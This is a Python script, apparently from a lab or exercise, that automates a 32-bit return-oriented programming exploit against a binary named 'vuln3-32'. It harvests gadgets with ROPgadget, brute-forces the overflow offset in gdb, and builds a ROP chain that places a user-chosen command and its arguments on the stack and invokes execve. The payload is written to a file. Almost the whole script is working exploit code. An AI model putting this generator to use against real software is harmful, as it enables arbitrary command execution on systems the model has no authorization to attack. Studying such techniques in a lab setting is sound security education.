#!/usr/bin/env python
from struct import pack
import subprocess
import os
import pprint as pp

# run ROPgadget tool to get useful rop gadgets
rop = subprocess.Popen(['ROPgadget', '--binary', 'vuln3-32', '--ropchain', '--silent'],
                     stdout=subprocess.PIPE,
                     universal_newlines=True,
                     bufsize=0)
rop.wait()

rop_gadgets = {
    'stackAddr' : None,
    'mov' : None,
    'popDst' : None,
    'popSrc' : None,
    'xorSrc' : None,
    'popB' : None,
    'popC' : None,
    'popD' : None,
    'xorA' : None,
    'incA' : None,
    'sys' : None
}

for line in rop.stdout:
    if "Step 1" in line:
        while "Step 2" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['mov'] == None:
                    rop_gadgets['mov'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popDst'] == None:
                    rop_gadgets['popDst'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popSrc'] == None:
                    rop_gadgets['popSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['xorSrc'] == None:
                    rop_gadgets['xorSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            if '[-]' in line:
                rop_gadgets['mov'] = None
                rop_gadgets['popDst'] = None
                rop_gadgets['popSrc'] = None
                rop_gadgets['xorSrc'] = None
            line = next(rop.stdout)
    if "Step 2" in line:
        while "Step 3" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['xorA'] == None:
                    rop_gadgets['xorA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['incA'] == None:
                    rop_gadgets['incA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 3" in line:
        while "Step 4" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['popB'] == None:
                    rop_gadgets['popB'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popC'] == None:
                    rop_gadgets['popC'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popD'] == None:
                    rop_gadgets['popD'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 4" in line:
        while "Step 5" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                rop_gadgets['sys'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 5" in line:
        while '.data' not in line:
            line = next(rop.stdout)
        gadget = line.split(' ')
        rop_gadgets['stackAddr'] = (gadget[3][:-1], ' '.join(gadget[4:])[2:-1])

pp.pprint(rop_gadgets)

padding = 0
found = False

while True:
    os.system('perl -e \'print "A"x{}, "DCBA"\' > input'.format(padding))
    gdb = subprocess.Popen(["gdb", "vuln3-32"],
                            stdin =subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            universal_newlines=True,
                            bufsize=0)

    gdb.stdin.write("r input\n")
    gdb.stdin.close()

    for line in gdb.stdout:
        print(line.strip())
        if 'SIGSEGV' in line:
            line = next(gdb.stdout)
            print(line.split(' ')[0][2:])
            if line.split(' ')[0][2:] == '41424344':
                print("FOUND PADDING:", padding, "\n")
                found = True
                
    if found:
        break
    padding += 4
    print('pad: ', padding, '\n')

STACKADDR = int(rop_gadgets['stackAddr'][0], 0)
MOV = pack("<I", int(rop_gadgets['mov'][0], 0))
POPDST = pack("<I", int(rop_gadgets['popDst'][0], 0))
POPSRC = pack("<I", int(rop_gadgets['popSrc'][0], 0))
XORSRC = pack("<I", int(rop_gadgets['xorSrc'][0], 0))
POPB = pack("<I", int(rop_gadgets['popB'][0], 0))
POPC = pack("<I", int(rop_gadgets['popC'][0], 0))
POPD = pack("<I", int(rop_gadgets['popD'][0], 0))
XORA = pack("<I", int(rop_gadgets['xorA'][0], 0))
INCA = pack("<I", int(rop_gadgets['incA'][0], 0))
SYS = pack("<I", int(rop_gadgets['sys'][0], 0))
PAD = pack("<I", 0x46464646)

# automatic 
def setA(pointer):
    buff = bytes('', 'ascii')
    buff += XORA
    buff += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': pointer})

    for _ in range(11):
        buff += INCA
        buff += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': pointer})
    
    return buff

def pushNULLbyOffset(offset):
    buff = bytes('', 'ascii')
    buff += POPDST
    print('NULL: ', STACKADDR + offset, '\n')
    buff += pack("<I", STACKADDR + offset)
    buff += addPadding(rop_gadgets['popDst'][1], {})

    buff += XORSRC
    buff += addPadding(rop_gadgets['xorSrc'][1], {})

    buff += MOV
    buff += addPadding(rop_gadgets['mov'][1], {})
    return buff

def pushNULLonAddress(address):
    buff = bytes('', 'ascii')
    buff += POPDST
    print('NULL: ', address, '\n')
    buff += pack("<I", address)
    buff += addPadding(rop_gadgets['popDst'][1], {})

    buff += XORSRC
    buff += addPadding(rop_gadgets['xorSrc'][1], {})

    buff += MOV
    buff += addPadding(rop_gadgets['mov'][1], {})
    return buff

def addPadding(gadget, regsSet):
    result = bytes('', 'ascii')
    # print('gadget: ', gadget, '\n')
    # print('regSet: ', regsSet, '\n')
    gadgetOps = gadget.split(' ; ')
    # print('ops: ', gadgetOps, '\n')
    for g in gadgetOps[1:]:
        g = g.split()
        # print('g: ', g, '\n')
        if g[0] == 'pop':
            reg = g[1]
            try:
                print('TRY\n')
                # print('regSet: ', regsSet, '\n')
                # print('reg: ',reg,'\n')
                # print('w: ', regsSet[reg], '\n')
                result += pack("<I", STACKADDR + regsSet[reg])
            except KeyError:
                print('EXCEPT\n')
                result += PAD

    return result

command_line = input('Command: ').split()
# print('cmd_line: ', command_line)
exec = command_line[0]
args = command_line[1:]
# print('args: ', args, '\n')

# add initial padding
p = bytes('A' * padding, 'ascii')

# ===================================================================================
# *filename SECTION
# ===================================================================================

# we'll use this to point to the right location on stack
stack_addr_pointer = 0

exec_correct_length = len(exec) % 4
if exec_correct_length != 0:
    # *filename can start with / or ./
    exec = exec[0] + '/' * (4 - exec_correct_length) + exec[1:]
    print('command: ', exec, '\n')

for _ in range(int(len(exec)/4)):
    p += POPDST
    p += pack("<I", STACKADDR + stack_addr_pointer)
    p += addPadding(rop_gadgets['popDst'][1], {})

    p += POPSRC
    p += bytes(exec[stack_addr_pointer : stack_addr_pointer + 4], 'ascii')
    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})

    p += MOV
    p += addPadding(rop_gadgets['mov'][1], {})
    stack_addr_pointer += 4

# push a NULL onto the stack after command is on stack 
p += pushNULLbyOffset(stack_addr_pointer)

# this puts a NULL pointer after the exec, however if we supply arguments,
# we just need a \0 so we can start writing 1 byte after exec
if len(args) != 0:
    stack_addr_pointer += 1

# ===================================================================================
# *argv[] SECTION
# ===================================================================================

arg_addresses = {exec : STACKADDR}
args_len = len(args)

for i in range(args_len):
    arg = args[i]
    arg_addresses[arg] = STACKADDR + stack_addr_pointer
    arg_correct_length = len(arg) % 4
    # print('args_size: ', arg_missing_length, '\n')
    if arg_correct_length != 0:
        arg += (4 - arg_correct_length) * 'A' # padding
        print('arg: ', arg, '\n')

    arg_size = int(len(arg)/4)
    arg_pointer = 0

    for j in range(arg_size):

        p += POPDST
        p += pack("<I", STACKADDR + stack_addr_pointer)
        p += addPadding(rop_gadgets['popDst'][1], {})

        p += POPSRC
        p += bytes(arg[arg_pointer : arg_pointer + 4], 'ascii')
        p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})

        p += MOV
        p += addPadding(rop_gadgets['mov'][1], {})
        arg_pointer += 4

        print('stack_pointer_before: ', stack_addr_pointer, '\n')
        if j == arg_size - 1 and arg_correct_length != 0:
            stack_addr_pointer += arg_correct_length
        else:
            stack_addr_pointer += 4

    p += pushNULLbyOffset(stack_addr_pointer)
    if i != args_len - 1:
        stack_addr_pointer += 1

# *argv[] needs last elemnt to be NULL pointer 
arg_addresses['NULL'] = STACKADDR + stack_addr_pointer

# print('--------------------------------------\n')
# pp.pprint(arg_addresses)

# ===================================================================================
# SHADOW STACK SECTION
# ===================================================================================

shadow_stack_address = arg_addresses['NULL'] + 4
arg_addresses['SHADOW_STACK'] = shadow_stack_address

comm_len = len(command_line)
for i in range(comm_len):

    p += pushNULLonAddress(shadow_stack_address)

    p += POPDST
    p += pack("<I", shadow_stack_address)
    p += addPadding(rop_gadgets['popDst'][1], {})

    p += POPSRC
    if i == 0:
        p += pack('<I', arg_addresses[exec])
    else:
        p += pack('<I', arg_addresses[args[i - 1]])
    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})

    p += MOV
    p += addPadding(rop_gadgets['mov'][1], {})
    if i != comm_len - 1:
        shadow_stack_address += 4

# NULL pointer
p += pushNULLonAddress(shadow_stack_address + 4)

p += POPB
p += pack("<I", arg_addresses[exec])
p += addPadding(rop_gadgets['popB'][1], {})

p += POPC
p += pack("<I", arg_addresses['SHADOW_STACK'])
p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})

p += POPD
p += pack("<I", arg_addresses['NULL'])
p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': stack_addr_pointer})

p += setA(stack_addr_pointer)

p += SYS

f = open('auto', 'wb')
f.write(p)
f.close()